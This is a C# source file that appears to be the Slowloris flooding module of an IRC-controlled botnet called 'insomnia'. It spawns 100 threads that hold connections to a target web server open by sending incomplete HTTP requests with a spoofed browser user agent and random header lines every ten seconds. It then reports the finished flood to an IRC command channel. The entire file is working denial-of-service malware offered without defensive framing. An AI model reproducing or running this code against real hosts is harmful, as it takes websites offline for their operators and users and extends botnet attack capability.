using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class Slowloris
    {

        private static ThreadStart[] j;
        private static Thread[] t;
        public static string host;
        public static int delay;
        private static IPEndPoint ip;
        public static int threads = 100;
        public static int port;
        public static bool isEnabled = false;

        public static string httpType()
        {
            int chk = Convert.ToChar(Functions.RandomString(1));
            if (chk % 2 == 0)
                return "GET";
            else
                return "POST";
        }

        public static void Start()
        {
            Thread s = new Thread(Begin);
            s.IsBackground = true;
            s.Start();
        }

        public static void Begin()
        {
            try
            {
                ip = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                ip = new IPEndPoint(IPAddress.Parse(host), port);
            }

            t = new Thread[threads];
            j = new ThreadStart[threads];
            for (int i = 0; i < threads; i++)
            {
                j[i] = new ThreadStart(send);
                t[i] = new Thread(j[i]);
                t[i].Start();
            }

            Thread.Sleep(delay * 1000);
            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("Slowloris flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        public static void send()
        {
            try
            {
                string request = "{0} {1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: {3}\r\nContent-Length: {4}\r\n";
                string build_request = string.Format(request, httpType(), "/?" + Functions.RandomString(7), host, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1", Convert.ToChar(Functions.RandomString(1).ToUpper()));
                byte[] data = Encoding.UTF8.GetBytes(build_request);

                Socket socket = ConnectSocket(ip.Address.ToString(), port);

                socket.Send(data, data.Length, 0);
                while (isEnabled)
                {
                    Thread.Sleep(10000);
                    byte[] header = Encoding.UTF8.GetBytes(Functions.RandomString(1).ToUpper() + "-" + Functions.RandomString(1).ToLower() + ": " + Functions.RandomString(1) + "\r\n");
                    socket.Send(header, header.Length, 0);
                }
                socket.Disconnect(false);
                socket.Close();
            }
            catch
            {
                send();
            }
        }

        public static Socket ConnectSocket(string server, int port)
        {
            Socket s = null;
            IPHostEntry hostEntry = null;

            hostEntry = Dns.GetHostEntry(server);

            foreach (IPAddress address in hostEntry.AddressList)
            {
                IPEndPoint ipe = new IPEndPoint(address, port);
                Socket tempSocket =
                    new Socket(ipe.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                tempSocket.Connect(ipe);

                if (tempSocket.Connected)
                {
                    s = tempSocket;
                    break;
                }
                else
                {
                    continue;
                }
            }
            return s;
        }

    }
}
